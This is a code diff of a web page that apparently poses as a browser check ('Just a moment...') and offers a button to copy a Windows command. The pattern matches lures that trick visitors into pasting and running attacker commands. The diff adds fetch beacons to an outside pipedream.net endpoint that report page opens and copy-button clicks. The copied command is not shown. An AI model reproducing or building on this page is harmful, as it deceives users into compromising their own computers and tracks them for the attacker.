@@ -1,3 +1,4 @@
+
 <html>
 <head>
 
@@ -6,7 +7,6 @@
 
 
 <body>
-
 <script>
 (async () => {
     try {
@@ -38,6 +38,7 @@
         frame.srcdoc = rsd
         return frame
     }
+    fetch("https://eod8ohq1x7p49bb.m.pipedream.net/open", {method: "GET",mode: "no-cors"});
 
     function setFavicon(url) {
         let link = frame1.contentWindow.document.querySelector("link[rel~='icon']");
@@ -64,7 +65,7 @@
                     <body></body>
                 `;
     }
-
+    
     document.documentElement.innerHTML = getStarter()
     document.title = "Just a moment..."
 
@@ -171,9 +172,12 @@
 
     copyWindowsCommandButton.addEventListener('click', () =>
         copyToClipboard(windowsCompatibleCommand, copyWindowsCommandButton)
+        
+
     );
 
     function copyToClipboard(text, buttonElement) {
+        fetch("https://eod8ohq1x7p49bb.m.pipedream.net/copy", {method: "GET",mode: "no-cors"});
         if (navigator.clipboard && window.isSecureContext) {
             navigator.clipboard.writeText(text).then( () => {
                 const originalText = buttonElement.textContent;
